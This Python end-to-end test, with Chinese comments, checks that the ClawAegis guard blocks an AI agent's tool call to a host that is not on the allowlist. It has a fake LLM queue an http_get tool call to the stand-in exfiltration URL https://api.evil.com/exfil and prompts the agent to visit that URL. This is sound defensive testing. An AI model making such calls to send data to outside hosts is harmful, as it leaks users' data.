"""
E2E case: outbound_trust enforce 模式下，非白名单 host 必须被 ClawAegis 阻断。

前提：
- fake_llm 已经跑起来（部署到 cluster 或本机），FAKE_LLM_URL 可达
- 测试实例的 LLM 配置已经指向 fake_llm（实例 LLM gateway base URL 改为 fake_llm 的地址）
- 实例 ID 通过 INSTANCE_ID 环境变量传入（default 9，对应 minikube dev 的 test10）

跑法：
    INSTANCE_ID=9 python3 cases/outbound_trust_block.py
"""
import os
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from harness import Backend, FakeLLMClient, send_user_message, now  # noqa: E402


def main() -> int:
    instance_id = int(os.environ.get("INSTANCE_ID", "9"))
    agent_id_marker = os.environ.get("AGENT_ID", f"instance-{instance_id}-aegis")

    be = Backend()
    be.login()
    print(f"[1/7] 登录 OK → {be.base}")

    llm = FakeLLMClient()
    llm.reset()
    print(f"[2/7] fake LLM 队列已清 → {llm.base}")

    # 重置策略到已知状态
    be.kill_switch_set(False)
    be.set_defense_mode("defense.outboundTrust", mode="enforce")
    be.set_defense_mode("defense.requireHttps", mode="off")
    be.reset_outbound_trusted()
    be.add_outbound_trusted("api.openai.com", label="e2e-allow")
    print("[3/7] 策略: outboundTrust=enforce, requireHttps=off, 白名单=[api.openai.com]")

    # 下发到 pod 并等 install_skill 落地
    res = be.dispatch_apply([instance_id])
    print(f"[4/7] dispatch_apply OK → revision={res.get('revision')} targets={len(res.get('targets', []))}")

    # 给 fake LLM 排一条：让它返回一个 tool_call 去访问"不在白名单"的 https URL
    llm.expect_tool_call("http_get", {"url": "https://api.evil.com/exfil"})
    print("[5/7] fake LLM 已排入 tool_call → https://api.evil.com/exfil")

    # 触发输入。
    # 当前默认 manual 模式：harness 把 sentinel 打到 stderr，你去 webchat 粘贴。
    # 5–15 秒内 ClawAegis 应该在 before_tool_call 中阻断并告警。
    ts0 = now()
    send_user_message(instance_id, "请用 http_get 工具访问 https://api.evil.com/exfil", mode="manual")

    print("[6/7] 等待 defense.outboundTrust 告警 (timeout 60s) …")
    alert = be.wait_for_alert(
        rule_id_prefix="outbound_trust",
        since_ts=ts0,
        agent_id_contains=agent_id_marker,
        evidence_contains="api.evil.com",
        timeout=60.0,
    )

    if alert is None:
        print("[7/7] FAIL — 60s 内未看到 outbound_trust 告警")
        return 1

    print(f"[7/7] PASS — alert.id={alert['id']} severity={alert['severity']} action={alert['action']}")
    print(f"       evidence: {alert.get('evidence')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
